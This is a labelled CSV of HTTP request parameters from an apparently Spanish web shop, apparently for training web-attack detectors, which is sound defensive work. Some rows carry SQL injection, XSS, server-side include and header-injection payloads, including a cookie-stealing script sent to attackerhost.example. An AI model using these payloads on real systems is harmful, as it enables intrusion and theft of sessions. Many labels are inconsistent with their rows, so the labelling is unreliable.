payload,attack_type,label
modo=entrar&login=antanas&pwd=soguillo&remember=on&B1=Entrar123,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=entrar&login=atl-sale&pwd=mocoso&remember=off&B1=Entrar,normal,0
modo=insertar&precio=3400%2B&B1=Confirmar,cmdi,1
ERRORmSG=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
errormsg=credenciales+incorrectas,normal,0
id=1%257C,normal,1
modo=registro&login=%7C&password=deSTRuIDor-a&nombre=Antares&apellidos=Pressel+Goyenaga&email=klarwein%40xavipetit.it&dni=83357480Y&direccion=C%2F+Las+Americas+8+&ciudad=Ponteceso&cp=24293&provincia=%C1lava&ntc=2255812100125453&B1=Registrar,cmdi,1
modo=registro&login=isaac&password=desFia709&nombre=Ivanka&apellidos=Ayestar%E1n+Pastor&emailA=olivier%40rockefeller.sh&dni=44979325L&direccion=Calle+Andalucia%2C+91+&ciudad=Casafranca&cp=05279&provincia=Soria&ntc=0629880233317520&B1=Registrar,cmdi,1
idA=1,normal,1
errorMsg=Credenciales+incorrectas,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=9&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=huntlee&password=da.mer%EDa&nombre=Abundio&apellidos=Vendrells+Unda&email=goetz-pongnati%40itrends.tt&dni=80216747S&direccion=Calle+Francisco+De+Diego%2C+83+1-H&ciudad=Moeche&cp=04897&provincia=Valladolid&ntc=714689639778546A&B1=Registrar,cmdi,1
modo=entrar&login=those&pwd=475t38la&remember=on&B1=Entrar123,normal,0
modo=entrar&login=el-gueba&pwd=9nte0uer3o&remember=off&B1=Entrar,normal,0
modo=registro&login=reubens&password=eXcEPtA&nombre=Yadhira&apellidos=Domich+Cajahuanca&email=rocco-misaki%40soybueno.nz&dni=28782647X&direccion=Sant+Sever+63%2C+6-B&ciudad=Manciles&cp=45240&provincia=Girona&ntc=7008973356777544&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=etoh&password=3Nt783E68r&nombre=Tatiano&apellidos=Renilla+Currius&email=sovagovic%40engomera.com.vc&dni=57024590T&direccion=Vera+De+Bidasoa+115%2C+6%3FC&ciudad=Lizo%E1in&cp=10520&provincia=Zamora&ntc=0723351625880614&B1A=Registrar,cmdi,1
id=1%22+AND+%221%22%3D%221,normal,1
B2=Vaciar+carrito,normal,0
MODO=INSERTAR&PRECIO=9853&b1=pASAR+POR+CAJA%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=insertar&precio=5445&B1=Pasar+por+caja,normal,0
B2=Vaciar+carrito123,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=entrar&login=fausto&pwd=pi6a1800&remember=on%2F&B1=Entrar,cmdi,1
modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato+Valle&email=grizzard%40ytv.com.mv&dni=%27+AND+%271%27%3D%271&direccion=C%2F+Juan+De+Lara+115%2C+9%3FA&ciudad=Mazcuerras&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
id=3&nombre=Queso+Manchego&precio=85&cantidadA=80&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=ezri&password=mo%21ralidad&nombre=Isaciar&apellidos=Foixenc+Illanes&email=renan1%40fichajes.nom.sd&dni=75730563G&direccion=C%2F+Echegaray+S%2FN%2C+&ciudad=Chueca&cp=23628&provincia=Alicante&ntc=0106099240126772&B1=Registrar,normal,0
modoA=entrar&login=sarracin&pwd=traslaticia&remember=off&B1=Entrar,cmdi,1
modo=entrar&login=wilmont&pwd=3ule1s&remember=on&B1=Entrar123,normal,0
id=1,normal,0
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=win-chyi&pwd=a1e143%2C3se&remember=off&B1=Entrar,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=85%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&cantidad=66&B1=A%F1adir+al+carrito123,sqli,1
ID=1BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
B2=Vaciar+carrito,normal,0
errormsg=credenciales+incorrectas,normal,0
id=2,normal,0
b2=vaciar+carrito,normal,0
id=1123,normal,0
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
MODO=REGISTRO&LOGIN=ALAIR&PASSWORD=tUBUl6S8&NOMBRE=rEADE&APELLIDOS=eLECCIONES+iZNAGA%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&EMAIL=RYPDAL.HIDAYAT%40HIPERBILBAO.BW&DNI=65285775e&DIRECCION=cONDOR%2c+82+13%3fe&CIUDAD=pARACUELLOS+DE+LA+rIBERA&CP=34870&PROVINCIA=sALAMANCA&NTC=9107192968626064&b1=rEGISTRAR,sqli,1
modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=2228A&provincia=Palencia&ntc=0517144420469351&B1=Registrar,cmdi,1
modo=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=marconi1&password=adularia&nombre=Venancio&apellidos=Del+Campillo+Aranda&email=blier%40ropadegolf.com.at&dni=70108873C&direccion=Paratge+Pla+18+8%3FD&ciudad=Sotorribas&cp=15391&provincia=Soria&ntc=6078216616409598&B1=Registrar123,sqli,1
modo=entrar&login=lareine2&pwd=eQUiparABLe&remember=on&B1=Entrar,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=insertar&precio=6&B1=Pasar+por+caja123,normal,0
modo=entrar&login=mandel&pwd=tras3jada&remember=off&B1A=Entrar,cmdi,1
id=1,normal,0
id=1&nombre=Vino+Rioja&precio=100&cantidad=75&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=rutledge&pwd=f8av2&remember=off&B1=Entrar,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=77&B1A=A%F1adir+al+carrito,cmdi,1
modo=registro&login=callie&password=c84a12a&nombre=Ariel&apellidos=Madriles+Hernandez&email=kwasniewska.tamburi%40testdevelcidad.cr&dni=93398116S&direccion=Pla%E7a+De+Gaudi%2C+57%2C+8%3FE&ciudad=Aldea+del+Cano&cp=23670&provincia=Valencia&ntc=6542491827196676&B1=Registrar123,normal,0
modo=registro&login=horng&password=Tablaz%F3N&nombre=Ta%EDs&apellidos=Salguero+Peri&email=hyland%40magritte.pm&dni=64709043S&direccion=Dieciocho+De+Julio%2C+83+&ciudad=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cp=11139&provincia=Valencia&ntc=9930911410161523&B1=Registrar123,sqli,1
B2=%2500,normal,1
modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=4021&B1=Confirmar123,xss,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=57&B1=A%F1adir+al+carrito,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=6538&b1=pasar+por+caja,normal,0
id=2,normal,0
modo=entrar&login=%3Fva%2Frennes&pwd=CIcEroNe&remember=off&B1=Entrar,cmdi,1
id=1,normal,0
modo=entrar&login=crommie&pwd=0eju0o&remember=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&B1=Entrar,sqli,1
B2=Vaciar+carrito,normal,0
modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja123,sqli,1
modo=registro&login=bechara&password=3xp2n18va&nombre=Wilfredo&apellidos=Zubicueta+Vallb%E9&email=rabasse%40showenvivo.com.yu&dni=66091214R&direccion=Alcatraz%2C+43%2C+2-G&ciudad=Medina+del+Campo&cp=07150&provincia=Alicante&ntc=2035446499597811&B1=Registrar,normal,0
modo=registro&login=tice&password=expol566%2157a&nombre=Arturo&apellidos=Fandi%F1o+Berzal&email=pembrooke_coates%40stainless.gd&dni=81383348X&direccion=Martin+Machio%2C+31+&ciudad=Tapia+de+Casariego&cp=18129&provincia=Huesca&ntc=0222583632895914&B1=Registrar,normal,0
id=1&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=32&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=bainton3&pwd=bab%e9lica&remember=off&b1=entrar,normal,0
modo=registro&login=farlay&password=escribida&nombre=Nela&apellidos=Magrans+Ribes&email=tchistyakov-linn-baker%40pool-control.tw&dni=12361918Q&direccion=Guipuzcoa+198%2C+1%3FD&ciudad=Villanueva+de+Sigena&cp=25300&provincia=Guip%FAzcoa&ntc=6545971193644202&B1=Registrar,normal,0
ida=1,normal,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=64&B1=A%F1adir+al+carrito123,normal,0
id=2&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=90&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=warrello2&password=0260l6st116&nombre=Piedad&apellidos=Sevilla+Subauste&email=marchard%40mailboxrussia.kw&dni=85125612J&direccion=C%2F+Guardia+Civil%2C+90%2C+&ciudad=Estamariu&cp=14240&provincia=Almer%EDa&ntc=7024918540973284&B1=Registrar,normal,0
id=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=55&B1=A%F1adir+al+carrito,cmdi,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=59&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=7613&B1=Confirmar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
id=1&nombre=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=100&cantidad=5&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=petruck&pwd=desnudez&remember=off&B1=Entrar,normal,0
b2=vACIAR+CARRITO%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=registro&login=schafer&password=7lI7e37r06&nombre=Santos&apellidos=Ricciardiello+Ameller&email=kelz%40animationproject.be&dni=08841812Z&direccion=Passeig+Oreneta+23+8%3FGbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ciudad=Huarte%2FUharte&cp=37488&provincia=C%E1ceres&ntc=7240523818698482&B1=Registrar,xss,1
ID=2&NOMBRE=jAM%f3N+iB%e9RICO&PRECIO=85&CANTIDAD=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&b1=a%f1ADIR+AL+CARRITO,xss,1
MODO=REGISTRO&LOGIN=PYE&PASSWORD=59ROLA9O&NOMBRE=hERMENEGILDA&APELLIDOS=lUNAR+dE+bROY&EMAIL=%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25&DNI=39171878a&DIRECCION=pLA%e7A+rECTORIA+17+8%3fa&CIUDAD=aL%e1JAR&CP=27118&PROVINCIA=sALAMANCA&NTC=5074100981550289&b1=rEGISTRAR,sqli,1
ERRORmSG=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=1%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=entrar&login=doretta5&pwd=InoFENSiVA&remember=off&B1=Entrar,normal,0
b2=vaciar+carrito,normal,0
B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modoA=registro&login=rivers&password=inconsultA&nombre=Jenifer&apellidos=Demuner&email=politti%40ubikuo.an&dni=08596294K&direccion=Calle+Don+Ramiro%2C+190+13G&ciudad=Valhermoso+de+la+Fuente&cp=09348&provincia=Navarra&ntc=2621915602759490&B1=Registrar,cmdi,1
ID=2&NOMBRE=qUESO+mANCHEGO&PRECIO=85&CANTIDAD=5&b1=a%f1ADIR+AL+CARRITO%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
ID=1%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
modo=registro&login=crampton4&password=Endoblar&nombre=Jan&apellidos=Eberl%E9&email=eclar%40magadan.org.edu&dni=86090489V&direccion=Avda.+Pio+Xii%2C+48+&ciudad=Aguilar+de+la+Frontera&cp=50830&provincia=Castell%F3n&ntc=7548017062827268&B1=Registrar,normal,0
modo=insertar&precio=3051&B1=Confirmar,normal,0
modo=registro&login=kiley&password=enjergado&nombre=Carhu%E9&apellidos=Gueldos+Donohue&email=dowson%40sehimaco.eg&dni=30827206F&direccion=Bisbe+Gonyalons+189+12%3FF&ciudad=Orihuela+del+Tremedal&cp=05631&provincia=Cuenca&ntc=1523492896649032&B1=Registrar,normal,0
idA=1,normal,1
modo=entrar&login=werling&pwd=eNcalador&remember=on&B1=Entrar,normal,0
modo=registro&login=brassard&password=09i%F1ar&nombre=Daym%E1n&apellidos=Aller+May%E1n&email=senghor-golling3%4024htranslations.ht&dni=96190989K&direccion=Calle+Agata%2C+33%2C+3%3FG&ciudad=Redonda%2C+La&cp=46822&provincia=Las+Palmas&ntc=2633454228346658%253F&B1=Registrar,cmdi,1
id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=3&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Queso+Manchego%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=100&cantidad=28&B1=A%F1adir+al+carrito,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
b2=vaciar+carrito,normal,0
B2=%257C,normal,1
B2=Vaciar+carrito,normal,0
modo=registro&login=elysia&password=dEgluTir&nombre=Pericles&apellidos=Feix%F3+Ablitas&email=dobrescu_brizzard%40enigmatico.so&dni=86913775H&direccion=Pla%E7a+Carles+Iba%F1ez+48%2C+6%3FG&ciudad=Arcos+de+Jal%F3n&cp=19332&provincia=Almer%EDa&ntc=8288603955421514&B1=Registrar,normal,0
id=1&nombre=Queso+Manchego&precio=39&cantidad=97&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=*%2Fvander%27we&pwd=pazguat5&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=1680&B1=Confirmar,normal,0
id=1,normal,0
id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=6&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=4673&B1A=Confirmar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&password=rencor&nombre=Roxana&apellidos=Murillo+Pastrana&email=constantaras%40fighting-machines.uk&dni=05736398Z&direccion=Calle+Victoria+Kents+46+&ciudad=San+Miguel+de+Serrezuela&cp=18330&provincia=Girona&ntc=2610269003230246&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=keefer&password=ma2e32&nombre=Cayo&apellidos=Acosa&email=vallalonga%40943.pf&dni=57500602G&direccion=Carre*r+Sant+Anton*i%2C+168%2C+10A&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=34240&provincia=Cantabria&ntc=3147683283735999&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
ida=1,normal,1
modo=registro&login=stiles&password=5a68i5ru9i2&nombre=Selene&apellidos=De+Asbaje+Abarzuza&email=guerra_russinov%40weat.fj&dni=68822552C&direccion=C%2F+Cabo+Alomar+Blanes+122+10%3FB&ciudad=Alam%FAs%2C+Els&cp=43774&provincia=A+Coru%F1a&ntc=8812117919949504&B1=Registrar,normal,0
modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=entrar&login=valcourt&pwd=pavor&remember=off&B1=Entrar,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=van_bent&password=t13si2ura&nombre=VahidReza&apellidos=Gilabert&email=dressler%40sanchezquesada.my&dni=91520697V&direccion=C%2F+Gandia+89%2C+5%3FD&ciudad=P%F3veda+de+Soria%2C+La&cp=50521&provincia=Ourense&ntc=243252281713196&B1=Registrar,cmdi,1
modo=insertar&precio=1044&B1=Pasar+por+caja,normal,0
id=1,normal,0
modo=entrar&login=roldan&pwd=gU5cIma&remember=on&B1=Entrar,normal,0
B2=Vaciar+carrito123,normal,0
modo=registro&login=mbrose&password=saltigallo&nombre=Lindolfo&apellidos=Pi%FA&email=roson-hawke%40horiginales.bh&dni=96110955G&direccion=Calle+Jaen+186%2C+8H&ciudad=Mi%F1o+de+San+Esteban&cp=19197&provincia=Burgos&ntc=2510637221475671&B1=Registrar123,normal,0
errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=78&B1=A%F1adir+al+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errormsg=credenciales+incorrectas,normal,0
idA=1,normal,1
modo=registro&login=lieneman&password=carteado&nombre=Valimir&apellidos=Escat+Monistca&email=kelsey%40helicopter.com.kh&dni=38626822R&direccion=Carlos+Trivi%F1o+Moreno%2C+2%2C+&ciudad=Quintela+de+Leirado&cp=15318&provincia=Valladolid&ntc=6182859902637153&B1=Registrar,normal,0
modo=entrar&login=eggebraa&pwd=enaltecedor&remember=on&b1=entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1%2F&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=melucci&password=F%D3nicO&nombre=Selene&apellidos=Jaraba+Villa&email=berba.andreguy4%40campanasextractoras.sh&dni=18653468P&direccion=Microscopio%2C+65+&ciudad=Segura&cp=34870&provincia=M%E1laga&ntc=4102716313272060&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=11&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=aisha&password=e9951r3nte&nombre=anselmo&apellidos=bertra+canamasa&email=baigent%40blueberryminiloaf.com.dj&dni=46978547n&direccion=los+halcones+160%2c+&ciudad=quel&cp=46712&provincia=le%f3n&ntc=9178266136569781&b1=registrar,normal,0
id=2123,normal,0
B2=Vaciar+carrito123,normal,0
modo=insertar&precio=285%4040&B1=Pasar+por+caja,cmdi,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=52&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidos=%2FA-musquivar+Lem*bomba&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=Avda.+Sanlucar+De+Barrameda+78+5-B&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar,cmdi,1
id=2%252B123,normal,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=37&B1=A%F1adir+al+carrito123,normal,0
modo=entrar&login=matthiew&pwd=99f0nfu%F1a6o53&remember=on&B1=Entrar,normal,0
id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=80&B1=A%F1adir+al+carrito,cmdi,1
MODO=INSERTAR&PRECIO=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=pASAR+POR+CAJA,sqli,1
modo=registro&login=pols&password=enjabonadura&nombre=Bethania&apellidos=Slaibe+Hipolit&email=verite%40culturalsanpedrocf.dm&dni=24797673Q&direccion=Cami+Son+Colam+153%2C+3-C&ciudad=Matilla+la+Seca&cp=26191&provincia=Ourense&ntc=1380667417846102&B1=Registrar123,normal,0
B2=Vaciar+carrito,normal,0
idA=1,normal,1
B2=Vaciar+carrito123,normal,0
id=3&nombre=Vino+Rioja&precio=39&cantidad=25&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,xss,1
id=2&nombre=Queso+Manchego&precio=85&cantidad=10&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas,normal,0
B2A=Vaciar+carrito,normal,1
id=2&nombre=Queso+Manchego&precio=85%2F&cantidad=58&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=generato&password=reto8sivo&nombre=quintiliana&apellidos=tahull+garola&email=prucha%40comerciosaspe.ps&dni=06966107m&direccion=pla%e7a+doctor+robert%2c+127+&ciudad=lloret+de+mar&cp=49181&provincia=toledo&ntc=4148689549974834&b1=registrar,normal,0
modo=registro&login=yeohoon&password=afectivo&nombre=Nelma&apellidos=Vic%E8n+Revuelta&email=moore%40cirugiaalbeiteria.lb&dniA=05422497V&direccion=Avenida+Xixo%2C+150+13B&ciudad=Corcubi%F3n&cp=31130&provincia=Zaragoza&ntc=8951724239129499&B1=Registrar,cmdi,1
B2A=Vaciar+carrito,normal,1
id=1&nombre=Queso+Manchego&precio=85&cantidad=42&B1=A%F1adir+al+carrito,normal,0
idA=3&nombre=Vino+Rioja&precio=39&cantidad=4&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,xss,1
modo=insertar&precio=9867&B1=Confirmar,normal,0
modo=registro&login=angeline0&password=tasajo&nombre=G.i%2Cno&apellidos=Gironell+Nurnberg&email=alari-clayton%40blueeyes.mm&dni=02864580E&direccion=C%2F+Pescadores+De+Terranova%2C+108%2C+9-E&ciudad=Gironella&cp=34309&provincia=Lleida&ntc=1940469779787284&B1=Registrar,cmdi,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=49&B1=A%F1adir+al+carrito%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modoA=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=C%2F+Quasimodo+95+13%3FE&ciudad=Arbanc%F3n&cp=37622&provincia=Zamora&ntc=7990892411881647&B1=Registrar,cmdi,1
B2=%2500,normal,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=4&B1A=A%F1adir+al+carrito,cmdi,1
b2=vaciar+carrito,normal,0
B2A=Vaciar+carrito,normal,1
errorMsg=Credenciales+incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org123,xss,1
modo=registro&login=zemanek&password=23IL04&nombre=Pangui&apellidos=Luczka+Graciot&email=francis%40ocymafa.tt&dni=08580215L&direccion=Calle+Padre+Perpi%F1an%2C+90%2C+7-B&ciudad=Sant+Juli%E0+de+Ramis&cp=37428&provincia=Tarragona&ntc=0479266564613834&B1=Registrar,normal,0
modo=entrar&login=patrica0&pwd=portal&remember=on&b1=entrar,normal,0
id=2%2F&nombre=Vino+Rioja&precio=85&cantidad=76&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=gavens0&password=revirado&nombre=Kaya&apellidos=Mojeda+Batet&email=munshin%40cirugiaplasticacordoba.hk&dni=65532112Y&direccion=Plaza+Flauta+16%2C+1%3FB&ciudad=Valdeavellano+de+Tera&cp=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&provincia=Teruel&ntc=2452355001922764&B1=Registrar123,sqli,1
errorMsg=Credenciales+incorrectas%252B,normal,1
modo=entrar&login=macmulli6&pwd=imp1o%2Cnunci0%2Cb%27le&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=d.antoni&pwd=6ab48t1r&remember=off&B1=Entrar,normal,0
idA=2,normal,1
modo=registro&login=stokker&password=do6a3er8&nombre=Leandra&apellidos=Orpez+Almod%F3var&email=schaab%40hispadis.li&dni=96068417Q&direccion=Calle+Montduber+75%2C+12%3FH&ciudad=Magacela&cp=04275&provincia=Lleida&ntc=272896003555179&B1=Registrar,cmdi,1
modo=registro&login=caudle&password=entremezclar&nombre=Blasinda&apellidos=Trafelati+Zurera&email=soeltoft%40nanogenerador.pr&dni=15896821A&direccion=Guadalquivir+116%2C+&ciudad=Cercs&cp=17405&provincia=Ourense&ntc=8245101859277917&B1=Registrar,normal,0
id=1&nombre=Vino+Rioja&precio=39&cantidad=38&B1=A%F1adir+al+carrito123,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=82&B1=A%F1adir+al+carrito,normal,0
modoA=insertar&precio=6536&B1=Confirmar,cmdi,1
modo=registro&login=visvanat&password=mohatrera&nombre=Helga&apellidos=Peratill&email=hauser%40whitepearlresort.as&dni=88363371Q&direccion=Calle+Sandoval+135%2C+4%3FB&ciudad=S%E1daba&cpA=40183&provincia=Zaragoza&ntc=6865627677043866&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=39&cantidadA=6&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=snedeker&password=74ain7l&nombre=Lihu%E9n&apellidos=Garabana+Belart&email=brana%40housemovie.id&dni=80937614Q&direccion=Banquilla%2C+171%2C+&ciudad=Sant+Vicen%E7+de+Castellet&cp=46179&provincia=M%E1laga&ntc=7500539436342438&B1=Registrar,normal,0
modo=registro&login=subhashi&password=%2Bfaccioso&nombre=Ademaro&apellidos=Rubau&email=eiffel%40noviasteresapalacios.coop&dni=44578051A&direccion=Ballena%2C+91%2C+10%3FA&ciudad=Cervera+del+R%EDo+Alhama&cp=49130&provincia=Teruel&ntc=8888494677705913&B1=Registrar,normal,0
modo=entrar&login=youping&pwd=2xorciza989&remember=on&B1=Entrar,normal,0
modo=insertar&precio=289&B1=Pasar+por+caja,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
